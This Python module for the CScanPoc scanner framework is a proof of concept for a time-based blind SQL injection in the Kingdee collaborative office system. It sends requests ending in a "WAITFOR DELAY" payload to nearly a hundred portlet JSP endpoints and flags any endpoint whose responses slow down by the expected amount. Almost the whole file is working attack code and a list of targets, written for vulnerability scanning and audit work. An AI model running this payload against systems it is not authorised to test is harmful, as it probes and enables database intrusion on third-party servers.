# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'kingdee_0005'  # 平台漏洞编号，留空
    name = '金蝶协同办公系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-09-11'  # 漏洞公布时间
    desc = '''
        金蝶协同办公管理系统助力企业实现从分散到协同，规范业务流程、降低运作成本，提高执行力，并成为领导的工作助手、员工工作和沟通的平台。
        金蝶协同办公系统文件参数过滤不严谨，造成SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0140344'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '金蝶协同办公系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd9c7e584-c71b-483e-a9c4-1bbb5588bf6d'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2015-0140344
            hh = hackhttp.hackhttp()
            payloads = [
                "/kingdee/portal/portlet/custom_Analytical/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/custom_Analytical_diagram/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/document/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/document_req/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/flow_performance_list/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/flow_performance_show/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/guestbook/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/guestbook_new/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/news_photos/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/office_history/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/office_process/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/outpage/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/person_doc_list/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/person_mail/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/person_new_doc/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/person_new_mail/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/person_new_plan/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/person_plan/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_bbs/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_db_conn/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_discuss/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_images/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_links/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_news/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_new_bbs/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_new_discuss/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_new_links/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_new_news/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_new_onLine/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_onLine/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_url/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/resource/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/userlink/set.jsp?portal_id=1",
                "/kingdee/portal/portlet/custom_Analytical/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/custom_Analytical_diagram/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/document/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/document_req/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/flow_performance_list/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/flow_performance_show/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/guestbook/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/guestbook_new/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/news_photos/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/office_history/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/office_process/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/outpage/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/person_doc_list/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/person_mail/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/person_new_doc/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/person_new_mail/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/person_new_plan/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/person_plan/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_bbs/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_db_conn/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_discuss/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_images/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_links/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_news/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_new_bbs/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_new_discuss/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_new_links/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_new_news/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_new_onLine/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_onLine/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_url/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/resource/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/userlink/set_submit.jsp?portal_id=1",
                "/kingdee/portal/portlet/custom_Analytical/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/custom_Analytical_diagram/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/document/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/document_req/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/flow_performance_list/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/flow_performance_show/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/guestbook/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/guestbook_new/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/news_photos/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/office_history/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/office_process/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/outpage/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/person_doc_list/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/person_mail/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/person_new_doc/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/person_new_mail/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/person_new_plan/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/person_plan/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_bbs/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_db_conn/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_discuss/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_images/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_links/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_news/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_new_bbs/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_new_discuss/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_new_links/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_new_news/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_new_onLine/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_onLine/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/pubinfo_url/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/resource/view.jsp?portal_id=1",
                "/kingdee/portal/portlet/userlink/view.jsp?portal_id=1"
            ]
            for payload in payloads:
                t1 = time.time()
                code1, _, _, _, _ = hh.http(self.target + payload)
                true_time = time.time() - t1
                t2 = time.time()
                url = self.target + payload + ";+WAITFOR+DELAY+'0:0:8'--"
                code2, _, _, _, _ = hh.http(url)
                false_time = time.time() - t2
                if code1 == 200 and code2 == 200 and false_time-true_time > 7:
                    # security_hole(arg+payload)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
